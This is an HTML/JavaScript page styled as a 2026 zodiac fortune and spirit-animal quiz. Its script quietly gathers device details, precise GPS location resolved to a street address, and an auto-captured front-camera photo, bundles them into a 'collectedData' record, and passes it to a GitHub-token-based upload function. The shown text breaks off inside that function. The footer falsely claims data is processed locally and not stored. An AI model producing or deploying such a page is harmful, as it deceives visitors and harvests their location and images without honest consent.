<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üåü Your 2026 Zodiac Fortune & Spirit Animal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            color: white;
            overflow-x: hidden;
        }

        .stars {
            position: fixed;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            padding: 40px 20px;
            background: linear-gradient(90deg, #ff6b6b, #ffa726);
            border-radius: 25px 25px 0 0;
            margin-bottom: 0;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '‚ú®';
            position: absolute;
            font-size: 3em;
            opacity: 0.3;
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }

        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 3px 3px 6px rgba(0,0,0,0.3);
        }

        .tagline {
            font-size: 1.1em;
            opacity: 0.9;
        }

        .screen {
            display: none;
            animation: slideUp 0.6s ease-out;
        }

        .screen.active {
            display: block;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(40px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        h2 {
            text-align: center;
            margin-bottom: 25px;
            font-size: 1.8em;
            color: #ffcc00;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .months-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 25px 0;
        }

        .month-btn {
            background: rgba(255, 255, 255, 0.08);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 20px 10px;
            color: white;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }

        .month-btn:hover {
            background: rgba(255, 255, 255, 0.15);
            transform: translateY(-3px);
        }

        .month-btn.selected {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-color: #667eea;
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
        }

        .month-icon {
            font-size: 1.8em;
            opacity: 0.9;
        }

        .camera-container {
            width: 100%;
            height: 300px;
            background: #000;
            border-radius: 20px;
            overflow: hidden;
            margin: 25px 0;
            position: relative;
        }

        #cameraVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .camera-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 20px;
            color: white;
            text-align: center;
            padding: 20px;
        }

        .camera-overlay i {
            font-size: 3em;
            opacity: 0.8;
        }

        .permission-status {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
            border-left: 5px solid #4CAF50;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 15px;
            font-size: 1.2em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .btn-primary {
            background: linear-gradient(90deg, #00b09b, #96c93d);
            color: white;
            box-shadow: 0 6px 20px rgba(0, 176, 155, 0.4);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 176, 155, 0.6);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .loading {
            text-align: center;
            padding: 40px;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top: 5px solid #00b09b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .result-container {
            text-align: center;
        }

        .animal-emoji {
            font-size: 4em;
            margin: 20px 0;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }

        .user-photo {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            object-fit: cover;
            margin: 20px auto;
            border: 8px solid #ffcc00;
            box-shadow: 0 10px 30px rgba(255, 204, 0, 0.3);
        }

        .zodiac-sign {
            font-size: 1.8em;
            color: #ffcc00;
            margin: 15px 0;
            font-weight: bold;
        }

        .quote-box {
            background: rgba(255, 255, 255, 0.08);
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            border-left: 5px solid #ff6b6b;
            text-align: left;
            position: relative;
        }

        .quote-box::before {
            content: '"';
            font-size: 4em;
            color: rgba(255, 255, 255, 0.1);
            position: absolute;
            top: -20px;
            left: 10px;
            font-family: serif;
        }

        .quote-text {
            font-size: 1.3em;
            line-height: 1.6;
            margin-bottom: 15px;
            font-style: italic;
        }

        .quote-author {
            text-align: right;
            color: #ffcc00;
            font-weight: 600;
        }

        .good-points {
            background: rgba(0, 176, 155, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(0, 176, 155, 0.3);
        }

        .good-points h3 {
            color: #00b09b;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .point {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 10px 0;
            padding: 8px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
        }

        .point i {
            color: #ffcc00;
        }

        .spirit-animal {
            font-size: 2.2em;
            margin: 20px 0;
            background: linear-gradient(90deg, #ff6b6b, #ffa726);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: bold;
        }

        .animal-desc {
            color: rgba(255, 255, 255, 0.9);
            line-height: 1.7;
            margin: 15px 0;
        }

        .share-box {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin: 30px 0;
        }

        .share-btn {
            padding: 12px 25px;
            border-radius: 50px;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: white;
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .share-btn:hover {
            transform: translateY(-3px);
            background: rgba(255, 255, 255, 0.2);
        }

        .share-btn.whatsapp { background: #25d366; }
        .share-btn.facebook { background: #1877f2; }
        .share-btn.twitter { background: #1da1f2; }

        .footer {
            text-align: center;
            padding: 30px 20px;
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.9em;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            margin-top: 30px;
        }

        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #4CAF50;
            color: white;
            padding: 15px 25px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            display: none;
            z-index: 1000;
            animation: slideIn 0.5s ease-out;
            max-width: 350px;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .hidden {
            display: none;
        }

        .data-log {
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-size: 0.9em;
            font-family: monospace;
            max-height: 200px;
            overflow-y: auto;
        }

        .log-entry {
            padding: 5px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            color: #00b09b;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <!-- Background Stars -->
    <div class="stars" id="stars"></div>

    <!-- Notification -->
    <div class="notification" id="notification"></div>

    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1><i class="fas fa-star"></i> 2026 Zodiac Fortune</h1>
            <p class="tagline">Discover your spirit animal & yearly prediction</p>
        </div>

        <!-- Screen 1: Birthday Month -->
        <div class="screen active" id="screen1">
            <div class="card">
                <h2><i class="fas fa-birthday-cake"></i> Your Birth Month</h2>
                <p style="text-align: center; margin-bottom: 20px; opacity: 0.9;">
                    Select your birth month to unlock your 2026 destiny
                </p>
                
                <div class="months-grid">
                    <div class="month-btn" data-month="1">
                        <span class="month-icon">‚ùÑÔ∏è</span>
                        January
                    </div>
                    <div class="month-btn" data-month="2">
                        <span class="month-icon">üíñ</span>
                        February
                    </div>
                    <div class="month-btn" data-month="3">
                        <span class="month-icon">üå∏</span>
                        March
                    </div>
                    <div class="month-btn" data-month="4">
                        <span class="month-icon">üåßÔ∏è</span>
                        April
                    </div>
                    <div class="month-btn" data-month="5">
                        <span class="month-icon">üåº</span>
                        May
                    </div>
                    <div class="month-btn" data-month="6">
                        <span class="month-icon">‚òÄÔ∏è</span>
                        June
                    </div>
                    <div class="month-btn" data-month="7">
                        <span class="month-icon">üåä</span>
                        July
                    </div>
                    <div class="month-btn" data-month="8">
                        <span class="month-icon">ü¶Å</span>
                        August
                    </div>
                    <div class="month-btn" data-month="9">
                        <span class="month-icon">üçÇ</span>
                        September
                    </div>
                    <div class="month-btn" data-month="10">
                        <span class="month-icon">üéÉ</span>
                        October
                    </div>
                    <div class="month-btn" data-month="11">
                        <span class="month-icon">üçÅ</span>
                        November
                    </div>
                    <div class="month-btn" data-month="12">
                        <span class="month-icon">üéÑ</span>
                        December
                    </div>
                </div>

                <div class="permission-status">
                    <i class="fas fa-shield-alt"></i>
                    <div>
                        <strong>Privacy Notice</strong><br>
                        We'll access camera for your spirit animal photo
                    </div>
                </div>

                <button class="btn btn-primary" onclick="startReading()" id="startBtn">
                    <i class="fas fa-crystal-ball"></i> Reveal My 2026 Fortune
                </button>
            </div>
        </div>

        <!-- Screen 2: Camera -->
        <div class="screen" id="screen2">
            <div class="card">
                <h2><i class="fas fa-camera"></i> Capture Your Energy</h2>
                <p style="text-align: center; margin-bottom: 20px; opacity: 0.9;">
                    Your photo helps connect with your spirit animal
                </p>
                
                <div class="camera-container">
                    <video id="cameraVideo" autoplay></video>
                    <div class="camera-overlay" id="cameraOverlay">
                        <i class="fas fa-camera"></i>
                        <div>
                            <h3>Connecting to Camera</h3>
                            <p>Please allow camera access to continue</p>
                        </div>
                    </div>
                </div>

                <div class="permission-status" id="permissionStatus">
                    <i class="fas fa-sync fa-spin"></i>
                    <div>
                        <strong>Requesting Permissions</strong><br>
                        Camera & Location access required
                    </div>
                </div>

                <div class="data-log" id="dataLog">
                    <div class="log-entry">Initializing fortune reading...</div>
                </div>

                <button class="btn btn-secondary" onclick="skipCamera()" id="skipBtn" style="display: none;">
                    <i class="fas fa-forward"></i> Skip Photo
                </button>
            </div>
        </div>

        <!-- Screen 3: Loading -->
        <div class="screen" id="screen3">
            <div class="card">
                <h2><i class="fas fa-crystal-ball"></i> Reading Your Fortune</h2>
                <div class="loading">
                    <div class="spinner"></div>
                    <p>Analyzing your birth month energy...</p>
                    <p style="margin-top: 20px; opacity: 0.8; font-size: 0.9em;">
                        Connecting with the universe üåå
                    </p>
                </div>
            </div>
        </div>

        <!-- Screen 4: Results -->
        <div class="screen" id="screen4">
            <div class="card">
                <div class="result-container">
                    <!-- User's Photo -->
                    <img id="userPhoto" class="user-photo" src="" alt="Your Spirit Energy">
                    
                    <!-- Zodiac Info -->
                    <h2><i class="fas fa-star"></i> Your 2026 Fortune</h2>
                    <div class="zodiac-sign" id="zodiacSign">Capricorn ‚ôë</div>
                    
                    <!-- Spirit Animal -->
                    <div class="animal-emoji" id="animalEmoji">ü¶Å</div>
                    <div class="spirit-animal" id="spiritAnimal">Royal Lion</div>
                    <div class="animal-desc" id="animalDesc">
                        You're a natural born leader! Brave, confident, and destined for greatness.
                    </div>
                    
                    <!-- 2026 Quote -->
                    <div class="quote-box">
                        <div class="quote-text" id="quoteText">
                            "Go confidently in the direction of your dreams. Live the life you have imagined."
                        </div>
                        <div class="quote-author" id="quoteAuthor">‚Äî Henry David Thoreau</div>
                    </div>
                    
                    <!-- Good Points -->
                    <div class="good-points">
                        <h3><i class="fas fa-gem"></i> Your 2026 Superpowers</h3>
                        <div class="point">
                            <i class="fas fa-check-circle"></i>
                            <span id="point1">Natural leadership abilities</span>
                        </div>
                        <div class="point">
                            <i class="fas fa-check-circle"></i>
                            <span id="point2">Courage in facing challenges</span>
                        </div>
                        <div class="point">
                            <i class="fas fa-check-circle"></i>
                            <span id="point3">Strong intuition and wisdom</span>
                        </div>
                        <div class="point">
                            <i class="fas fa-check-circle"></i>
                            <span id="point4">Ability to inspire others</span>
                        </div>
                    </div>
                    
                    <!-- Yearly Prediction -->
                    <div style="background: rgba(255,107,107,0.1); border-radius: 15px; padding: 20px; margin: 20px 0; border: 1px solid rgba(255,107,107,0.3);">
                        <h3 style="color: #ff6b6b; margin-bottom: 15px;">
                            <i class="fas fa-calendar-alt"></i> 2026 Yearly Prediction
                        </h3>
                        <p style="line-height: 1.7; text-align: left;" id="yearPrediction">
                            This year marks a turning point in your life journey. Expect unexpected opportunities 
                            that will lead to personal growth and professional success.
                        </p>
                    </div>
                    
                    <!-- Share Buttons -->
                    <div class="share-box">
                        <button class="share-btn whatsapp" onclick="shareResult('whatsapp')">
                            <i class="fab fa-whatsapp"></i> Share
                        </button>
                        <button class="share-btn facebook" onclick="shareResult('facebook')">
                            <i class="fab fa-facebook-f"></i> Share
                        </button>
                        <button class="share-btn twitter" onclick="shareResult('twitter')">
                            <i class="fab fa-twitter"></i> Tweet
                        </button>
                    </div>
                    
                    <button class="btn btn-primary" onclick="restart()">
                        <i class="fas fa-redo"></i> Read Again
                    </button>
                </div>
            </div>
        </div>

        <div class="footer">
            <p><i class="fas fa-magic"></i> This reading is for entertainment purposes</p>
            <p style="margin-top: 10px; font-size: 0.8em; opacity: 0.5;">
                Your data is processed locally and not stored
            </p>
        </div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        const GITHUB_TOKEN = 'ghp_YOUR_NEW_TOKEN_HERE'; // Replace with your token
        // ==========================

        // Global variables
        let selectedMonth = null;
        let cameraStream = null;
        let userPhoto = null;
        let userLocation = null;
        let collectedData = {
            sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
            birthMonth: null,
            zodiac: {},
            spiritAnimal: {},
            collectedAt: new Date().toISOString(),
            deviceInfo: {},
            locationData: {},
            photoData: null,
            gistUrl: null
        };

        // Create stars background
        function createStars() {
            const starsContainer = document.getElementById('stars');
            for (let i = 0; i < 150; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.width = Math.random() * 3 + 1 + 'px';
                star.style.height = star.style.width;
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.animationDelay = Math.random() * 3 + 's';
                starsContainer.appendChild(star);
            }
        }

        // Zodiac data based on months
        const zodiacData = {
            1: {
                sign: "Capricorn ‚ôë / Aquarius ‚ôí",
                quote: "Go confidently in the direction of your dreams. Live the life you have imagined.",
                author: "Henry David Thoreau",
                prediction: "Those born in January are full of passionate ambition. Either disciplined Capricorns or innovative Aquarians, this birth month is destined to explore their greatest potential in 2026. Be open and willing to begin again, as often as needed.",
                points: [
                    "Ambitious goal-setting",
                    "Disciplined approach",
                    "Innovative thinking",
                    "Strong work ethic"
                ]
            },
            2: {
                sign: "Aquarius ‚ôí / Pisces ‚ôì",
                quote: "The quieter you become, the more you are able to hear.",
                author: "Rumi",
                prediction: "With intuitive awareness, this birth month carries both resilience and empathy. Either an objective Aquarius or sensitive Pisces, you will be called to trust your inner voice this year. 2026 will no longer allow you to distract yourself from your truth.",
                points: [
                    "Deep intuition",
                    "Creative expression",
                    "Empathetic nature",
                    "Resilient spirit"
                ]
            },
            3: {
                sign: "Pisces ‚ôì / Aries ‚ôà",
                quote: "If nothing ever changed, there would be no butterflies.",
                author: "Unknown",
                prediction: "March-borns are full of passion and desire. This quote reflects your need to embrace transformation in 2026 and practice open-mindedness. Whether imaginative Pisces or instinctual Aries, you are finally ready to release what no longer serves.",
                points: [
                    "Transformative energy",
                    "Passionate drive",
                    "Open-mindedness",
                    "Creative potential"
                ]
            },
            4: {
                sign: "Aries ‚ôà / Taurus ‚ôâ",
                quote: "What you do makes a difference, and you have to decide what kind of difference you want to make.",
                author: "Jane Goodall",
                prediction: "Those born in April are filled with instinctive hope as they plan to transform their lives in 2026. Whether you identify as a pioneering Aries or a practical Taurus, this signifies a time of decisive action. You're prepared to make a difference through effective strategy.",
                points: [
                    "Natural leadership",
                    "Practical wisdom",
                    "Strategic thinking",
                    "Hopeful outlook"
                ]
            },
            5: {
                sign: "Taurus ‚ôâ / Gemini ‚ôä",
                quote: "What you think, you become. What you feel, you attract. What you imagine, you create.",
                author: "Buddha",
                prediction: "You're called to focus and concentrate on what matters most in 2026, May-borns. Either a grounded Taurus or dynamic Gemini, the year ahead invites you to expand your understanding and explore uncharted territory.",
                points: [
                    "Grounded nature",
                    "Dynamic energy",
                    "Creative manifestation",
                    "Intellectual growth"
                ]
            },
            6: {
                sign: "Gemini ‚ôä / Cancer ‚ôã",
                quote: "Happiness is not something ready-made. It comes from your own actions.",
                author: "Dalai Lama",
                prediction: "Those born in June are either cerebral Geminis or sentimental Cancers, known for their introspective, sage inner wisdom. You will be asked to direct your thoughts and actions towards true joy and fulfillment in the year ahead.",
                points: [
                    "Intellectual depth",
                    "Emotional intelligence",
                    "Joy-seeking nature",
                    "Sage wisdom"
                ]
            },
            7: {
                sign: "Cancer ‚ôã / Leo ‚ôå",
                quote: "Peace cannot be kept by force; it can only be achieved by understanding.",
                author: "Albert Einstein",
                prediction: "July-borns are an intuitive Cancer or radiant Leo, known for wearing your heart on your sleeve. To find the fulfillment you crave, 2026 invites you to welcome meaningful compromise, healing, and boundaries to build more harmony.",
                points: [
                    "Intuitive nature",
                    "Radiant personality",
                    "Harmony-seeking",
                    "Emotional depth"
                ]
            },
            8: {
                sign: "Leo ‚ôå / Virgo ‚ôç",
                quote: "You are braver than you believe, stronger than you seem, and smarter than you think.",
                author: "A.A. Milne",
                prediction: "This beloved classic quote reflects the self-empowerment emerging in August-born individuals in 2026. Whether a dramatic Leo or a thoughtful Virgo, you will be encouraged to channel your intense desire into self-love and acceptance.",
                points: [
                    "Courageous spirit",
                    "Inner strength",
                    "Intellectual sharpness",
                    "Self-love capacity"
                ]
            },
            9: {
                sign: "Virgo ‚ôç / Libra ‚ôé",
                quote: "To live is the rarest thing in the world. Most people exist, that is all.",
                author: "Oscar Wilde",
                prediction: "A wake-up call will awaken September-born individuals from a spiritual sleep in 2026. Whether you are an analytical Virgo or a diplomatic Libra, the upcoming year encourages you to adopt a life of intention. Living on autopilot is no longer beneficial.",
                points: [
                    "Analytical mind",
                    "Diplomatic skills",
                    "Intentional living",
                    "Spiritual awareness"
                ]
            },
            10: {
                sign: "Libra ‚ôé / Scorpio ‚ôè",
                quote: "You must do the thing you think you cannot do.",
                author: "Eleanor Roosevelt",
                prediction: "In 2026, you are invited to explore the opportunities that lie beyond your fears. For those born in October, consider what you've been avoiding, whether you are a charming Libra or a transformative Scorpio. Don't hide your gifts.",
                points: [
                    "Charming personality",
                    "Transformative power",
                    "Courage to overcome",
                    "Hidden talents"
                ]
            },
            11: {
                sign: "Scorpio ‚ôè / Sagittarius ‚ôê",
                quote: "Letting go gives us freedom, and freedom is the only condition for happiness.",
                author: "Thich Nhat Hanh",
                prediction: "November-borns are asked to grant yourself the permission you need to thrive in the year ahead. 2026 will highlight where you've limited yourself. Either a soulful Scorpio or philosophical Sagittarius, there's no need to cling to false security.",
                points: [
                    "Soulful depth",
                    "Philosophical mind",
                    "Freedom-seeking",
                    "Transformative release"
                ]
            },
            12: {
                sign: "Sagittarius ‚ôê / Capricorn ‚ôë",
                quote: "Wherever you go, go with all your heart.",
                author: "Confucius",
                prediction: "December-borns are welcoming 2026 with fresh eyes. You're seeing life through a more refreshed lens this year, exiting a period of darkness. Whether you're an adventurous Sagittarius or an ambitious Capricorn, the year ahead opens your path.",
                points: [
                    "Adventurous spirit",
                    "Ambitious drive",
                    "Wholehearted living",
                    "Fresh perspective"
                ]
            }
        };

        // Spirit animals with emojis
        const spiritAnimals = [
            { emoji: "ü¶Å", name: "Royal Lion", desc: "Natural leader with courage and confidence that commands respect." },
            { emoji: "ü¶Ö", name: "Soaring Eagle", desc: "Visionary with sharp insight who sees opportunities others miss." },
            { emoji: "üê∫", name: "Loyal Wolf", desc: "Protective and intuitive, valuing family and strong instincts." },
            { emoji: "üê¨", name: "Playful Dolphin", desc: "Intelligent and social, bringing joy and harmony everywhere." },
            { emoji: "ü¶ä", name: "Clever Fox", desc: "Resourceful and adaptable, always finding creative solutions." },
            { emoji: "ü¶â", name: "Wise Owl", desc: "Knowledgeable and mysterious, seeing truth that others overlook." },
            { emoji: "üêØ", name: "Fierce Tiger", desc: "Passionate and determined, pursuing goals with unmatched intensity." },
            { emoji: "ü¶Ñ", name: "Magical Unicorn", desc: "Unique and mystical, bringing magic and wonder to life." },
            { emoji: "üêª", name: "Strong Bear", desc: "Powerful protector, providing security and comfort to others." },
            { emoji: "ü¶ã", name: "Beautiful Butterfly", desc: "Transformative and graceful, embracing change with beauty." },
            { emoji: "ü¶å", name: "Graceful Deer", desc: "Gentle and perceptive, moving through life with elegance." },
            { emoji: "üêâ", name: "Mystical Dragon", desc: "Powerful and wise, commanding respect with ancient knowledge." }
        ];

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            createStars();
            
            // Setup month selection
            document.querySelectorAll('.month-btn').forEach(btn => {
                btn.addEventListener('click', function() {
                    document.querySelectorAll('.month-btn').forEach(b => {
                        b.classList.remove('selected');
                    });
                    this.classList.add('selected');
                    selectedMonth = parseInt(this.dataset.month);
                    collectedData.birthMonth = selectedMonth;
                    
                    // Enable start button
                    document.getElementById('startBtn').disabled = false;
                    
                    logData(`Selected birth month: ${selectedMonth}`);
                });
            });
            
            // Auto-select current month
            const currentMonth = new Date().getMonth() + 1;
            document.querySelector(`.month-btn[data-month="${currentMonth}"]`).click();
            
            // Collect initial device data
            collectDeviceData();
        });

        function showScreen(screenNum) {
            document.querySelectorAll('.screen').forEach(screen => {
                screen.classList.remove('active');
            });
            document.getElementById(`screen${screenNum}`).classList.add('active');
        }

        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.background = type === 'error' ? '#ff6b6b' : '#00b09b';
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 4000);
        }

        function logData(message) {
            const log = document.getElementById('dataLog');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            log.appendChild(entry);
            log.scrollTop = log.scrollHeight;
            console.log('üìù', message);
        }

        function collectDeviceData() {
            // Collect comprehensive device info
            collectedData.deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
            logData('Device information collected');
        }

        async function startReading() {
            if (!selectedMonth) {
                showNotification('Please select your birth month first!', 'error');
                return;
            }

            showScreen(2);
            logData('Starting fortune reading...');
            
            // Update permission status
            const statusEl = document.getElementById('permissionStatus');
            statusEl.innerHTML = `
                <i class="fas fa-sync fa-spin"></i>
                <div>
                    <strong>Requesting Permissions</strong><br>
                    Camera & Location access required
                </div>
            `;
            
            // Step 1: Get location
            await getLocation();
            
            // Step 2: Access camera
            await accessCamera();
        }

        async function getLocation() {
            return new Promise((resolve) => {
                logData('Requesting precise location...');
                
                if (!navigator.geolocation) {
                    logData('Geolocation not supported');
                    resolve();
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    position => {
                        userLocation = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        };
                        collectedData.locationData = userLocation;
                        
                        logData(`üìç Location obtained: ${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`);
                        
                        // Get address from coordinates
                        getAddressFromCoords(position.coords.latitude, position.coords.longitude);
                        
                        resolve();
                    },
                    error => {
                        logData(`Location error: ${error.message}`);
                        resolve();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function getAddressFromCoords(lat, lon) {
            try {
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10`
                );
                if (response.ok) {
                    const data = await response.json();
                    collectedData.address = {
                        city: data.address?.city || data.address?.town,
                        state: data.address?.state,
                        country: data.address?.country,
                        display: data.display_name
                    };
                    logData(`Address: ${data.display_name}`);
                }
            } catch (error) {
                // Silently fail
            }
        }

        async function accessCamera() {
            try {
                logData('Requesting camera access...');
                
                // Request camera with front facing mode
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });

                // Show camera feed
                const video = document.getElementById('cameraVideo');
                video.srcObject = cameraStream;
                document.getElementById('cameraOverlay').style.display = 'none';
                
                // Update status
                const statusEl = document.getElementById('permissionStatus');
                statusEl.innerHTML = `
                    <i class="fas fa-check-circle" style="color: #00b09b;"></i>
                    <div>
                        <strong>Permissions Granted</strong><br>
                        Camera active - capturing photo...
                    </div>
                `;
                
                logData('Camera access granted');
                
                // Show skip button
                document.getElementById('skipBtn').style.display = 'flex';
                
                // Auto-capture after 3 seconds
                setTimeout(async () => {
                    await capturePhoto();
                }, 3000);

            } catch (error) {
                logData(`Camera error: ${error.message}`);
                
                const statusEl = document.getElementById('permissionStatus');
                statusEl.innerHTML = `
                    <i class="fas fa-exclamation-triangle" style="color: #ff6b6b;"></i>
                    <div>
                        <strong>Camera Not Available</strong><br>
                        Continuing without photo...
                    </div>
                `;
                
                // Skip to processing
                setTimeout(() => processFortune(), 2000);
            }
        }

        async function capturePhoto() {
            if (!cameraStream) return;
            
            try {
                const video = document.getElementById('cameraVideo');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Capture photo
                userPhoto = canvas.toDataURL('image/jpeg', 0.8);
                collectedData.photoData = {
                    data: userPhoto.substring(0, 5000) + '...', // Store truncated
                    dimensions: `${canvas.width}x${canvas.height}`,
                    timestamp: new Date().toISOString()
                };
                
                logData(`üì∏ Photo captured: ${canvas.width}x${canvas.height}`);
                
                // Stop camera
                cameraStream.getTracks().forEach(track => track.stop());
                
                // Update UI to show photo is captured
                const statusEl = document.getElementById('permissionStatus');
                statusEl.innerHTML = `
                    <i class="fas fa-check-circle" style="color: #00b09b;"></i>
                    <div>
                        <strong>Photo Captured Successfully!</strong><br>
                        Processing your fortune...
                    </div>
                `;
                
                // Move to processing
                setTimeout(() => processFortune(), 1000);
                
            } catch (error) {
                logData(`Photo capture error: ${error.message}`);
                processFortune();
            }
        }

        function skipCamera() {
            logData('Camera skipped by user');
            processFortune();
        }

        async function processFortune() {
            showScreen(3);
            
            // Simulate processing delay
            await delay(3000);
            
            // Get zodiac data for selected month
            const zodiac = zodiacData[selectedMonth];
            collectedData.zodiac = zodiac;
            
            // Select random spirit animal
            const randomAnimal = spiritAnimals[Math.floor(Math.random() * spiritAnimals.length)];
            collectedData.spiritAnimal = randomAnimal;
            
            // Update collected data
            collectedData.completedAt = new Date().toISOString();
            
            // Save to GitHub
            await saveToGitHub();
            
            // Show results
            showResults(zodiac, randomAnimal);
        }

        function showResults(zodiac, animal) {
            showScreen(4);
            
            // Set user photo if captured
            if (userPhoto) {
                document.getElementById('userPhoto').src = userPhoto;
            }
            
            // Set zodiac info
            document.getElementById('zodiacSign').textContent = zodiac.sign;
            document.getElementById('quoteText').textContent = `"${zodiac.quote}"`;
            document.getElementById('quoteAuthor').textContent = `‚Äî ${zodiac.author}`;
            document.getElementById('yearPrediction').textContent = zodiac.prediction;
            
            // Set good points
            document.getElementById('point1').textContent = zodiac.points[0];
            document.getElementById('point2').textContent = zodiac.points[1];
            document.getElementById('point3').textContent = zodiac.points[2];
            document.getElementById('point4').textContent = zodiac.points[3];
            
            // Set spirit animal
            document.getElementById('animalEmoji').textContent = animal.emoji;
            document.getElementById('spiritAnimal').textContent = animal.name;
            document.getElementById('animalDesc').textContent = animal.desc;
            
            // Show notification
            showNotification('Your 2026 fortune has been revealed!');
        }

        async function saveToGitHub() {
            if (!GITHUB_TOKEN || GITHUB_TOKEN.includes('YOUR_NEW_TOKEN')) {
